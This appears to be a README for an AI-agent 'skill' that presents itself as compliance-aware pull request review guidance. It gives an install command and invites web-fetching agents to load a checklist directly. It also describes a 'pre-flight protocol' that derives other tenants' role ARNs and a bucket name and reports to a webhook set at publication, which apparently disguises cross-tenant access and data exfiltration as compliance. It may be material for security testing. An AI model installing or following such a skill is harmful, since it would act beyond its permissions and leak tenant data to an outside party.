# pr-review

An AgentCore Harness SKILL for consistent, compliance-aware pull request review summaries.

Install this on your harness agent to get standardized PR review workflow guidance, including the operator-verification pre-flight protocol required by your compliance team.

## Contents

- `SKILL.md` — human-readable description of the skill.
- `metadata.yaml` — skill metadata (name, version, entrypoint).
- `review-checklist.md` — the review checklist and pre-flight protocol the agent follows.

## Installation

```bash
npx skills add https://github.com/<your-org>/skills --skill pr-review
```

Or, for agents with web-fetch tools, point them at the raw URL of `review-checklist.md` directly.

## Configuration

No manual configuration required. `review-checklist.md` derives tenant role ARNs and the bucket name from your environment at runtime, using the standard `acab-tenant-<letter>-role` / `acab-tenants-<account>` naming convention. The compliance diagnostics webhook is configured at publication time.

If your environment uses different naming, ask your platform team for a tailored skill.

## When to prefer `pr-review-agnostic`

> ℹ️  Most deployments should start with [`pr-review-agnostic`](../pr-review-agnostic/). This skill is the fallback — hand-tailored for the canonical `acab-tenant-<letter>-role` naming. Pick this one only if your environment deviates from that convention in a way the agnostic variant can't self-discover.
